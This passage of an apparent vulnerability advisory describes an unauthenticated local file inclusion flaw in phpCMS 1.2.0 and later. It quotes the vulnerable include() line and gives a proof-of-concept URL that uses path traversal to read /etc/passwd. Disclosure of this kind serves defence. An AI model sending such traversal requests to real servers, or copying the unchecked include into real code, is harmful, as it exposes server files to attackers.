vendor description:
---------------
phpCMS is a content management system, which convinces in particular by
small
system requirements, high performance and above all its flexibility.


vulnerabilty overview:
---------------
a flaw in phpCMS makes it possible to include arbitrary files on the server.
as the "include" statement is called before any session checks occur,
this vuln
can be exploited without any prior authentication.


proof of concept:
---------------

the vulnerable include call resides in class.layout_phpcms.php:

if(isset($_GET['language']) && $_GET['language'] != '') {
    include($PHPCMS_INCLUDEPATH.'/language.'.$_GET[language]);
[...]

so you are able to do something like:

http://vu1n.com/parser/parser.php?&phpcmsaction=FILEMANAGER&language=de/../../../../../../../etc/passwd

according to Ignatius from the phpCMS Core Team, the vulnerable code
line was introduced in phpCMS 1.2.0. older versions are not affected by
